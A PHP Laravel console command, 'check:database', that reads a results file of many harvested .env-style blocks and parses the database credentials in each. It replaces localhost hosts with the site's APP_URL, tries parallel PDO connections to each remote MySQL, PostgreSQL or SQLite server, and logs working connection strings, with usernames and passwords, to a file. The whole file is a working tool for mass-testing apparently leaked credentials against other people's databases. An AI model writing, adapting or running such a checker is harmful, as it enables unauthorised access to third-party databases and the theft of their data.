<?phpnamespace App\Console\Commands;use Illuminate\Console\Command;use M1\Env\Parser;use Spatie\Fork\Fork;use function Termwind\render;class DatabaseCheckCommand extends Command{    protected $signature = 'check:database';    protected $description = 'Command description';    public function handle(): void    {        $databases = file_get_contents(base_path('results/database.txt'));        $databases = str($databases)->explode("====================");        $databases = $databases->chunk(500);        $supportedDrivers = [            'sqlite',            'mysql',            'pgsql'        ];        foreach ($databases as $chunked) {            $tasks = [];            foreach ($chunked as $database) {                $database = collect(Parser::parse(trim($database)));                $DB_CONNECTION = str($database->get('DB_CONNECTION'))->lower()->trim();                if (!in_array($DB_CONNECTION, $supportedDrivers)) {                    continue;                }                $tasks[] = function () use ($database, $DB_CONNECTION) {                    $DB_HOST = $database->get('DB_HOST');                    if ($DB_HOST === 'localhost' || $DB_HOST === '127.0.0.1') {                        $DB_HOST = $database->get('APP_URL');                    }                    if ($DB_HOST === 'localhost' || $DB_HOST === '127.0.0.1') {                        return;                    }                    $DB_PORT = $database->get('DB_PORT');                    $DB_DATABASE = $database->get('DB_DATABASE');                    $DB_USERNAME = $database->get('DB_USERNAME');                    $DB_PASSWORD = $database->get('DB_PASSWORD');                    $connectionString = "{$DB_CONNECTION}:host={$DB_HOST};port={$DB_PORT};dbname={$DB_DATABASE}";                    $connectionStringWithUserPass = "{$connectionString};user={$DB_USERNAME};password={$DB_PASSWORD}";                    try {                        new \PDO($connectionString, $DB_USERNAME, $DB_PASSWORD, [                            \PDO::ATTR_TIMEOUT => 10,                        ]);                        $this->info($connectionStringWithUserPass);                        file_put_contents(                            'results/database_connected.txt',                            $connectionStringWithUserPass . PHP_EOL,                            FILE_APPEND                        );                    } catch (\PDOException $e) {                        $message = "{$connectionStringWithUserPass}; message={$e->getMessage()};";                        file_put_contents(                            'results/database_errors.txt',                            $message . PHP_EOL,                            FILE_APPEND                        );                        $this->error($message, false);                    }                };            }            Fork::new()->run(...$tasks);        }    }    public function error($string, $verbosity = null)    {        render(<<<HTML            <div class="text-red-500">                {$string}            </div>        HTML);    }}